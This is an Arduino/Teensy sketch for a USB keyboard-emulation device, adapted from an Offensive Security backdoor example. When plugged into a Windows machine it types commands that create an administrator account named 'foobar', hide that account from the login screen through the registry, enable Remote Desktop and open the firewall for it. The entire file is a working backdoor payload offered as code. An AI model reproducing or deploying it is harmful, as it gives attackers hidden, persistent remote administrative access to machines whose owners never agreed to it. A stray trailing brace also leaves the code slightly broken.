// Copyright 2014 Glenn ten Cate
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// Code example used from:
// https://github.com/offensive-security/hid-backdoor-peensy/blob/master/peensy.ino
// ------------------------------------------------------------------------------

void setup() {}
void loop()
{ 
  delay(2500);
  SheepAdd_user("foobar","foobar");
  delay(2500);
  SheepEnable_rdp(); 
  delay(30000);
}
   
  
// Adds a hidden local administrative user to the Windows machine.
void SheepAdd_user(char *username,char *password)
{
  Keyboard.print("net user ");
  Keyboard.print(username);
  Keyboard.print(" ");
  Keyboard.print(password);
  Keyboard.println(" /add");
  delay(300);
  	
  Keyboard.print("net localgroup administrators ");
  Keyboard.print(username);
  Keyboard.println(" /add");
  delay(300);
  	
  Keyboard.print("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v ");
  Keyboard.print(username);
  Keyboard.println(" /d 0 /t REG_DWORD /f");
  delay(300);
}

// Enable RDP and open firewall 
void SheepEnable_rdp(void)
{
  Keyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
  delay(500);
  Keyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f");
  delay(500);
  Keyboard.println("sc start termservice");
  delay(3000);
  Keyboard.println("netsh firewall set service type = remotedesktop mode = enable");
  delay(1000);
}

}
